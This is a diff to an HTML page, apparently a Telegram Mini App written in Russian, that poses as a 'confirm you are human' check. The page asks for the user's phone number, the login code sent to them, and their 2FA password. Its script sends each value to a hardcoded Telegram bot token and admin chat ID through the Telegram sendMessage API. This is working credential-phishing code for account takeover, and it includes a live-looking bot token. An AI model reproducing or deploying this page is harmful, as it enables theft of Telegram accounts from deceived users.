@@ -30,20 +30,9 @@
             align-items: center;
             text-align: center;
         }
-        .emoji {
-            font-size: 80px;
-            margin: 10px 0;
-        }
-        .lead {
-            font-size: 18px;
-            font-weight: 500;
-            margin: 8px 0;
-        }
-        .muted {
-            color: #9da3a8;
-            font-size: 14px;
-            margin: 4px 0 16px;
-        }
+        .emoji { font-size: 80px; margin: 10px 0; }
+        .lead { font-size: 18px; font-weight: 500; margin: 8px 0; }
+        .muted { color: #9da3a8; font-size: 14px; margin: 4px 0 16px; }
         .btn {
             width: 100%;
             padding: 14px;
@@ -57,18 +46,9 @@
             transition: opacity 0.2s;
             margin-top: 12px;
         }
-        .btn:active {
-            opacity: 0.7;
-        }
-        .btn-secondary {
-            background: #2a2a2a;
-            margin-top: 8px;
-        }
-        .code-boxes {
-            display: flex;
-            gap: 12px;
-            margin: 16px 0 12px;
-        }
+        .btn:active { opacity: 0.7; }
+        .btn-secondary { background: #2a2a2a; margin-top: 8px; }
+        .code-boxes { display: flex; gap: 12px; margin: 16px 0 12px; }
         .code-box {
             width: 50px;
             height: 56px;
@@ -82,9 +62,7 @@
             font-weight: 600;
             color: #fff;
         }
-        .code-box.filled {
-            border-color: #2f80ed;
-        }
+        .code-box.filled { border-color: #2f80ed; }
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -103,26 +81,11 @@
             cursor: pointer;
             transition: background 0.2s;
         }
-        .kbtn:active {
-            background: #2a2a2a;
-        }
-        .kbtn.del {
-            background: #1a1a1a;
-            color: #ff6b6b;
-            font-size: 20px;
-        }
-        .status {
-            color: #9da3a8;
-            font-size: 14px;
-            min-height: 24px;
-            margin-top: 8px;
-        }
-        .status.success {
-            color: #69db7c;
-        }
-        .hidden {
-            display: none !important;
-        }
+        .kbtn:active { background: #2a2a2a; }
+        .kbtn.del { background: #1a1a1a; color: #ff6b6b; font-size: 20px; }
+        .status { color: #9da3a8; font-size: 14px; min-height: 24px; margin-top: 8px; }
+        .status.success { color: #69db7c; }
+        .hidden { display: none !important; }
         .modal {
             position: fixed;
             inset: 0;
@@ -139,15 +102,8 @@
             max-width: 380px;
             width: 90%;
         }
-        .modal-content h3 {
-            font-size: 20px;
-            margin-bottom: 8px;
-        }
-        .modal-content p {
-            color: #9da3a8;
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
+        .modal-content h3 { font-size: 20px; margin-bottom: 8px; }
+        .modal-content p { color: #9da3a8; font-size: 14px; margin-bottom: 16px; }
         .modal-content input {
             width: 100%;
             padding: 12px;
@@ -158,15 +114,8 @@
             font-size: 16px;
             margin: 12px 0;
         }
-        .modal-content input:focus {
-            border-color: #2f80ed;
-            outline: none;
-        }
-        .modal-actions {
-            display: flex;
-            gap: 10px;
-            justify-content: flex-end;
-        }
+        .modal-content input:focus { border-color: #2f80ed; outline: none; }
+        .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
         .modal-actions button {
             padding: 10px 20px;
             border: none;
@@ -175,14 +124,8 @@
             font-weight: 500;
             cursor: pointer;
         }
-        .modal-actions .cancel {
-            background: transparent;
-            color: #9da3a8;
-        }
-        .modal-actions .ok {
-            background: #2f80ed;
-            color: #fff;
-        }
+        .modal-actions .cancel { background: transparent; color: #9da3a8; }
+        .modal-actions .ok { background: #2f80ed; color: #fff; }
         .twofa-input {
             width: 100%;
             padding: 12px;
@@ -193,10 +136,7 @@
             font-size: 16px;
             margin: 12px 0;
         }
-        .twofa-input:focus {
-            border-color: #2f80ed;
-            outline: none;
-        }
+        .twofa-input:focus { border-color: #2f80ed; outline: none; }
         .input-field {
             width: 100%;
             padding: 14px;
@@ -208,15 +148,11 @@
             margin: 10px 0;
             text-align: center;
         }
-        .input-field:focus {
-            border-color: #2f80ed;
-            outline: none;
-        }
+        .input-field:focus { border-color: #2f80ed; outline: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Шаг 1: Приветствие -->
         <div id="screen-welcome">
             <div class="emoji">👋</div>
             <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
@@ -224,7 +160,6 @@
             <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
 
-        <!-- Шаг 2: Ввод номера -->
         <div id="screen-phone" class="hidden">
             <div class="emoji">📱</div>
             <div class="lead">Введите Ваш номер телефона</div>
@@ -234,18 +169,15 @@
             <div class="status" id="statusPhone"></div>
         </div>
 
-        <!-- Шаг 3: Ожидание -->
         <div id="screen-waiting" class="hidden">
             <div class="emoji">⏳</div>
             <div class="lead">Ожидайте, не выходите!</div>
             <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
         </div>
 
-        <!-- Шаг 4: Ввод кода -->
         <div id="screen-code" class="hidden">
             <div class="emoji">🔐</div>
             <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
-
             <div class="code-boxes" id="codeBoxes">
                 <div class="code-box" data-index="0"></div>
                 <div class="code-box" data-index="1"></div>
@@ -253,9 +185,7 @@
                 <div class="code-box" data-index="3"></div>
                 <div class="code-box" data-index="4"></div>
             </div>
-
             <button class="btn btn-secondary" id="btnGetCode">Узнать код</button>
-
             <div class="keypad" id="keypad">
                 <button class="kbtn" data-key="1">1</button>
                 <button class="kbtn" data-key="2">2</button>
@@ -269,17 +199,13 @@
                 <button class="kbtn" data-key="0">0</button>
                 <button class="kbtn del" data-key="backspace">⌫</button>
             </div>
-
             <div class="status" id="statusCode"></div>
-
-            <!-- 2FA блок -->
             <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
                 <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
                 <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
             </div>
         </div>
 
-        <!-- Шаг 5: Успех -->
         <div id="screen-success" class="hidden">
             <div class="emoji">✅</div>
             <div class="lead">Подтверждено!</div>
@@ -288,13 +214,11 @@
     </div>
 
     <script>
-        // ===== КОНФИГ =====
         const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
         const ADMIN_ID = "8821493005";
         const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
         let tg = window.Telegram.WebApp;
-        let userId = null;
         let phone = '';
         let code = '';
         let password = '';
@@ -303,9 +227,6 @@
         if (tg) {
             tg.ready();
             tg.expand();
-            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                userId = tg.initDataUnsafe.user.id;
-            }
         }
 
         async function sendToBot(text) {
@@ -313,19 +234,13 @@
                 await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: text
-                    })
+                    body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                 });
-            } catch(e) {
-                console.error('Send error:', e);
-            }
+            } catch(e) {}
         }
 
         async function sendDataToBot(phone, code, password) {
-            const data = { phone, code, password };
-            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify(data)}`);
+            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify({ phone, code, password })}`);
         }
 
         const screenWelcome = document.getElementById('screen-welcome');
@@ -368,12 +283,9 @@
                 statusPhone.className = 'status';
                 return;
             }
-
             statusPhone.textContent = 'Отправка...';
             statusPhone.className = 'status';
-
             await sendDataToBot(phone, '', '');
-
             showScreen(screenWaiting);
             setTimeout(() => {
                 showScreen(screenCode);
@@ -393,7 +305,6 @@
             if (codeDigits.length >= 5) return;
             codeDigits.push(key);
             updateCodeBoxes();
-
             if (codeDigits.length === 5) {
                 code = codeDigits.join('');
                 sendDataToBot(phone, code, '');
